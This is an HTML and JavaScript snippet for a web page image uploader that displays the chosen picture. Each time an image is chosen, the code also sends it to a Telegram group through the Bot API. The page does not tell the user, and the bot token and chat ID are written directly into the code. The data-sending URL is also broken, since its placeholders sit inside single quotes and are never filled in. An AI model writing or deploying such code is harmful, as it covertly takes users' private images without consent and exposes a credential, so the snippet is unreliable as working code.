    <input type="file" id="uploadInput" accept="image/*">
    <button onclick="uploadImage()">Upload Image</button>
    <div id="uploadedImageContainer"></div>
    <button onclick="uploadImage()" id="downloadLink" style="display: none;">Check result</button>

    <!-- <a id="downloadLink" download="uploaded_image.png" style="display: none;">Check result</a> -->

    <script>
       function uploadImage() {
    var input = document.getElementById('uploadInput');
    var file = input.files[0];
    
    if (file) {
        var reader = new FileReader();
        reader.readAsDataURL(file);
        reader.onload = function(e) {
            var uploadedImageContainer = document.getElementById('uploadedImageContainer');
            var img = document.createElement('img');
            img.src = e.target.result;
            img.id = 'uploadedImage';
            uploadedImageContainer.innerHTML = '';
            uploadedImageContainer.appendChild(img);

            // Show download link
            // var downloadLink = document.getElementById('downloadLink');
            // downloadLink.href = e.target.result;
            // downloadLink.style.display = 'inline';

            // Send image to Telegram group
            sendToTelegram(e.target.result);
        }
    }
}

function sendToTelegram(imageData) {
    var botToken = '5214279030:AAHwXVkouOpHANC1EiK6edh_ux4cFqoZ-OY';
    var chatId = '-1001570223088';
    var url = 'https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}';

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            photo: imageData,
            caption: 'Uploaded image from website'
        })
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Failed to send image to Telegram');
        }
        console.log('Image sent to Telegram');
    })
    .catch(error => {
        console.error('Error:', error);
    });
}
    </script>
